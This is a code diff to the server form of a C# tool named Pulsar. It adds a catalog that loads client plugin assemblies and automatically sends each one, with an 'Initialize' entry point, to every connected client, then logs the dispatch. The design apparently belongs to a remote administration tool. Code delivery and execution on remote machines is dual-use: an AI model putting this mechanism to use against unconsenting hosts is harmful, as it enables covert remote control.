@@ -102,6 +102,10 @@ namespace Pulsar.Server.Forms
         private PluginManager _pluginManager;
         private FrmPluginManager _pluginManagerForm;
         private ServerContext _serverContext;
+        private readonly HashSet<Client> _clientsWithPluginsLoaded = new HashSet<Client>();
+        private ClientPluginCatalog _clientPluginCatalog;
+        private readonly Dictionary<Client, HashSet<string>> _clientAutoPluginState = new();
+        private readonly object _clientAutoPluginLock = new();
 
         public FrmMain()
         {
@@ -427,6 +431,8 @@ namespace Pulsar.Server.Forms
                     ListenServer.Disconnect();
                     
                 UnregisterMessageHandler();
+
+                _clientPluginCatalog?.Dispose();
                 
                 if (_previewImageHandler != null)
                 {
@@ -710,6 +716,12 @@ namespace Pulsar.Server.Forms
             OfflineClientRepository.MarkClientOffline(client);
             ScheduleOfflineListRefresh();
             ScheduleStatsRefresh();
+
+            _clientsWithPluginsLoaded.Remove(client);
+            lock (_clientAutoPluginLock)
+            {
+                _clientAutoPluginState.Remove(client);
+            }
             lock (_clientConnections)
             {
                 if (!ListenServer.Listening) return;
@@ -4914,6 +4926,10 @@ namespace Pulsar.Server.Forms
                 }
                 
                 _pluginManager.LoadFrom(pluginsDir);
+
+                _clientPluginCatalog = new ClientPluginCatalog(_serverContext);
+                _clientPluginCatalog.PluginsChanged += OnClientPluginsChanged;
+                _clientPluginCatalog.LoadFrom(pluginsDir);
                 
                 ApplyUIExtensions();
                 
@@ -4935,6 +4951,53 @@ namespace Pulsar.Server.Forms
             
             ApplyUIExtensions();
             UpdatePluginStatus();
+        }
+
+        private void OnClientPluginsChanged(object sender, EventArgs e)
+        {
+            if (InvokeRequired)
+            {
+                Invoke(new Action<object, EventArgs>(OnClientPluginsChanged), sender, e);
+                return;
+            }
+
+            var currentKeys = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
+            if (_clientPluginCatalog?.Plugins is { Count: > 0 } plugins)
+            {
+                foreach (var descriptor in plugins)
+                {
+                    currentKeys.Add(descriptor.CacheKey);
+                }
+            }
+
+            lock (_clientAutoPluginLock)
+            {
+                if (currentKeys.Count == 0)
+                {
+                    _clientAutoPluginState.Clear();
+                }
+                else
+                {
+                    foreach (var state in _clientAutoPluginState.Values)
+                    {
+                        state.RemoveWhere(key => !currentKeys.Contains(key));
+                    }
+                }
+            }
+
+            UpdatePluginStatus();
+
+            var clients = ListenServer?.ConnectedClients;
+            if (clients == null)
+            {
+                return;
+            }
+
+            foreach (var client in clients)
+            {
+                if (client == null || !client.Connected) continue;
+                SendClientOnlyPlugins(client);
+            }
         }
         
         private void ApplyUIExtensions()
@@ -5014,11 +5077,13 @@ namespace Pulsar.Server.Forms
             }
 
             var enabledPlugins = 0;
+            var clientPluginCount = 0;
             var connectedCount = 0;
 
             try
             {
                 enabledPlugins = _pluginManager?.Plugins?.Count ?? 0;
+                clientPluginCount = _clientPluginCatalog?.Plugins?.Count ?? 0;
                 connectedCount = ListenServer?.ConnectedClients?.Length ?? 0;
             }
             catch (Exception ex)
@@ -5029,7 +5094,7 @@ namespace Pulsar.Server.Forms
             {
                 // Always update status bar, even if there was an error
                 listenToolStripStatusLabel.Text = $"Listening on port: 8080";
-                connectedToolStripStatusLabel.Text = $"Connected: {connectedCount} | Active plugins: {enabledPlugins}";
+                connectedToolStripStatusLabel.Text = $"Connected: {connectedCount} | Server plugins: {enabledPlugins} | Client plugins: {clientPluginCount}";
             }
         }
 
@@ -5037,20 +5102,76 @@ namespace Pulsar.Server.Forms
         {
             try
             {
-                if (_pluginManager?.Plugins == null) return;
-
-                foreach (var plugin in _pluginManager.Plugins)
+                if (_clientsWithPluginsLoaded.Contains(client))
                 {
-                    if (plugin is IServerPlugin serverPlugin)
+                    return;
+                }
+
+                if (_pluginManager?.Plugins != null)
+                {
+                    foreach (var plugin in _pluginManager.Plugins)
                     {
-                        // Load universal plugins to the client
-                        LoadUniversalPluginToClient(client, serverPlugin);
+                        if (plugin is IServerPlugin serverPlugin && serverPlugin.AutoLoadToClients)
+                        {
+                            // Load universal plugins to the client
+                            LoadUniversalPluginToClient(client, serverPlugin);
+                        }
                     }
                 }
+
+                SendClientOnlyPlugins(client);
+
+                _clientsWithPluginsLoaded.Add(client);
             }
             catch (Exception ex)
             {
                 EventLog($"Error loading plugins for client {client.EndPoint}: {ex.Message}", "error");
+            }
+        }
+
+        private void SendClientOnlyPlugins(Client client)
+        {
+            if (_clientPluginCatalog == null)
+            {
+                return;
+            }
+
+            var plugins = _clientPluginCatalog.Plugins;
+            if (plugins == null || plugins.Count == 0)
+            {
+                return;
+            }
+
+            List<ClientPluginDescriptor> pending;
+            lock (_clientAutoPluginLock)
+            {
+                if (!_clientAutoPluginState.TryGetValue(client, out var sentSet))
+                {
+                    sentSet = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
+                    _clientAutoPluginState[client] = sentSet;
+                }
+
+                pending = new List<ClientPluginDescriptor>();
+                foreach (var descriptor in plugins)
+                {
+                    if (sentSet.Add(descriptor.CacheKey))
+                    {
+                        pending.Add(descriptor);
+                    }
+                }
+            }
+
+            foreach (var descriptor in pending)
+            {
+                try
+                {
+                    PushSender.LoadUniversalPlugin(client, descriptor.PluginId, descriptor.AssemblyBytes, descriptor.InitData, descriptor.TypeName, "Initialize");
+                    EventLog($"Dispatched client plugin '{descriptor.PluginId}' v{descriptor.Version} to {client.EndPoint}", "info");
+                }
+                catch (Exception ex)
+                {
+                    EventLog($"Failed to send client plugin '{descriptor.PluginId}' to {client.EndPoint}: {ex.Message}", "error");
+                }
             }
         }
 
